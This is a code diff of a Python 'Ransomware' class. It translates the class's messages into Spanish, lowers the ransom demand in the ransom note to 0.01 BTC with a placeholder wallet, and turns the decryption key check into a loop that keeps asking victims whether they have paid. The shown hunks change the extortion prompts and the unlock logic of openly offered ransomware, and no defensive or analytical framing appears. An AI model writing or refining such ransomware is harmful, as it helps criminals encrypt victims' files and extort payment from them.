@@ -40,14 +40,14 @@ class Ransomware:
 
     def obtain_key(self):
         """ Obtain key from a user. """
-        return input("Please enter a key: ").encode()
+        return input("Ingrese la llave: ").encode()
 
     def ransom_user(self):
         """ Inform user about encryption of his files. """
         print(
             "  _____\n/     \n| () () |\n \\  ^  /\n  |||||\n  |||||"
-            "Hi, all your files has been encrypted. Please "
-            "send 0.1 BTC on this address to get decryption"
+            "Hola, todos tus archivos han sido cifrados. Por favor "
+            "envia 0.01 BTC a la siguiente cartera: xxxxxxxxxxx para recuperarlos "
         )
 
     def decrypt_file(self, key, filename):
@@ -125,10 +125,14 @@ class Ransomware:
         """
         num_decrypted_files = 0
         # Obtain a key from the user.
-        key = self.obtain_key()
-        if key != self.key:
-            print('Wrong key!')
-            return
+        while True:
+            key = self.obtain_key()
+            if key == self.key:
+                print("FELICIDADES, recuperaste todo\n\n")
+                break
+            if key != self.key:
+                print('Llave incorrecta. Ya pagaste?\n')
+            
 
         files = self.get_files_in_folder(path)
 
